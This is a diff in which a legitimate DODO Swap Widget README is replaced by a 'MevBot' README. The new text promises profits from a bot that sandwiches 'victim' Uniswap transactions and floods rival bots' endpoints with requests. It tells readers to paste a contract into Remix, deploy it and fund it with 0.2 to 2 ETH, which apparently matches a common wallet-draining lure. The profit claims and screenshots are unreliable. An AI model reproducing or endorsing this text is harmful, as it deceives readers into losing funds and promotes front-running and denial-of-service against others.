@@ -1,75 +1,100 @@
-# DODO Widget
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
-<p align="center">
-  <a>
-    <img src="https://i.postimg.cc/W4q937Db/Logo.png" alt="DODO" />
-  </a>
-</p>
 
-<p align="center">
-<a href="https://www.npmjs.com/package/@dodoex/widgets"><img src="https://img.shields.io/npm/v/@dodoex/widgets" alt="npm version" /></a>
-<p>
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-## DODO Swap Widget
+## For demonstration purposes, other wallets will be used for testing below.
 
-The DODO Swap Widget allows you to build customized front-end interfaces for the DODO protocol, and embed widgets in DeFi applications for quick asset exchange and other uses. DODO currently supports 9 chains in total, including Ethereum, BNB Chain, Polygon, Arbitrum, Avalanche, OKC, Optimism, Aurora, and Conflux eSpace. We intend to add support for more chains in the future.
 
-## Installation
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
-Install the widgets library via `npm` or `yarn`.
+## Update 08.05.2023 (Result)
 
-```js
-yarn add @dodoex/widgets
-```
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
-```js
-npm i --save @dodoex/widgets
-```
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
-## Documentation
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-You can find the DODO Widget documentation [on the website](https://docs.dodoex.io/english/developers/swap-widget) and check out the [Getting Started](https://docs.dodoex.io/english/developers/swap-widget/getting-started) page for a quick overview.
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-- [Profit-Sharing Instructions](https://docs.dodoex.io/english/developers/swap-widget/profit-sharing-instructions)
-- [API](https://docs.dodoex.io/english/developers/swap-widget/api)
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
 
-## Examples
+Finally, the ETH is returned to the contract for withdrawal.
 
-Inside the `examples` folder, there two different examples,
+This bot performs all of these functions faster than 99% of other bots.
 
-For react app:
+*But ser, there are open source bots that do the same*
 
-```shell
-$ git clone git@github.com:DODOEX/widgets.git
-$ cd example/react-app
-```
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
 
-For js app:
+*Wen increase aggressiveness ?*
 
-```shell
-$ git clone git@github.com:DODOEX/widgets.git
-$ cd example/js-app
-```
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
 
-Install and run the example:
+*What did I learn?*
 
-```bash
-yarn          # install dependencies
-yarn start    # run the development server
-# or
-npm           # install dependencies
-npm run start # run the development server
-```
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
 
-Other details:
+*So why stop?*
 
-- [React App](https://github.com/DODOEX/widgets/tree/main/example/react-app)
-- [JS App](https://github.com/DODOEX/widgets/tree/main/example/js-app)
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
 
-## License
 
-- [GPL-3.0 ](https://github.com/DODOEX/widgets/blob/main/LICENSE)
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
 
-## About DODO
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
 
-- [DODO Web](https://dodoex.io/)
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
+
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
+
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
+
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
+
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
+
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
+
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
+
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
+
+
+
+
+
+
+
+
+
